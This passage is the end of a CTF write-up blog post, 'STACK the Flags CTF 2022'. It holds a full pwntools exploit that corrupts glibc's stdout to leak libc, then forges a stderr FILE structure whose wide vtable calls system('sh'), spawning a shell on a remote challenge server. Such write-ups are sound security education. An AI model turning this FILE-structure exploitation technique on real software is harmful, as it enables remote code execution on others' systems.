</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;cursed_grimoires_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;157.230.242.192&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30472</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">val</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit_binary</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create a big chunk, so that our chunk is located on the newly page</span>
</span></span><span class="line"><span class="cl"><span class="c1"># created by mmap (To be precise, at libc_base-0xf7ff0)</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_size</span>      <span class="o">=</span> <span class="mi">1000000</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_to_libc</span>  <span class="o">=</span> <span class="mh">0xf7ff0</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">chunk_size</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Leak libc base via stdout
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the correct offset for stdout and stderr</span>
</span></span><span class="line"><span class="cl"><span class="n">stdout_offset_from_chunk</span> <span class="o">=</span> <span class="n">offset_to_libc</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_offset_from_chunk</span> <span class="o">=</span> <span class="n">offset_to_libc</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stdout offset: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout_offset_from_chunk</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stderr offset: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stderr_offset_from_chunk</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite stdout-&gt;_flags to 0x1800</span>
</span></span><span class="line"><span class="cl"><span class="n">flags_offset</span> <span class="o">=</span> <span class="mh">0x0</span>  <span class="c1"># stdout-&gt;_flags  = &amp;stdout + 0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1800</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flags</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stdout_offset_from_chunk</span><span class="o">+</span><span class="n">flags_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">flags</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite stdout-&gt;_IO_write_ptr to be larger than</span>
</span></span><span class="line"><span class="cl"><span class="n">write_ptr_offset</span> <span class="o">=</span> <span class="mh">0x28</span> <span class="c1"># stdout-&gt;_IO_write_ptr = &amp;stdout + 0x28</span>
</span></span><span class="line"><span class="cl"><span class="n">write_ptr_lsb</span>    <span class="o">=</span> <span class="mh">0x50</span> <span class="c1"># You can choose any value. I choose 0x50</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stdout_offset_from_chunk</span><span class="o">+</span><span class="n">write_ptr_offset</span><span class="p">,</span> <span class="n">write_ptr_lsb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, when the binary called menu() (which will call puts())</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It will leak a libc address, which equivalents to _IO_stdfile_1_lock</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)[</span><span class="mi">5</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked libc  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_stdfile_1_lock&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc base    : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0xf7ff0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Chunk addr   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">chunk_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Getting RIP Control via exit through stderr
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake _wide_vtable</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_addr</span>                         <span class="o">=</span> <span class="n">chunk_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_doallocate_offset_from_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_vtable_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span>                                   <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_vtable_doallocate_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake _wide_data</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_addr</span>                            <span class="o">=</span> <span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_IO_write_base_offset_from_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_IO_buf_base_offset_from_chunk</span>   <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_wide_vtable_offset_from_chunk</span>   <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0xe0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_IO_write_base_offset to 0</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_IO_write_base_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_IO_buf_base_offset to 0</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_IO_buf_base_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_wide_vtable_addr</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_wide_vtable to fake_wide_vtable_addr</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_wide_vtable_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Forge stderr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span>                <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">flags</span>          <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;  sh</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mi">1</span> <span class="c1"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_wide_data</span>     <span class="o">=</span> <span class="n">fake_wide_data_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake_stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">fake_stderr_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stderr_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Exit and profit :D</span>
</span></span><span class="line"><span class="cl"><span class="n">exit_binary</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">Twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" data-title="STACK the Flags CTF 2022" data-via="Chovid99" data-hashtags="Writeup,STACK the Flags,pwn,heap,Education,FILE"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/stack-the-flags/">STACK the Flags</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/education/">Education</a>,&nbsp;<a href="/tags/file/">FILE</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/hitcon-ctf-2022/" class="prev" rel="prev" title="HITCON CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HITCON CTF 2022</a>
            <a href="/posts/hacktm-ctf-2023/" class="next" rel="next" title="HackTM CTF 2023">HackTM CTF 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
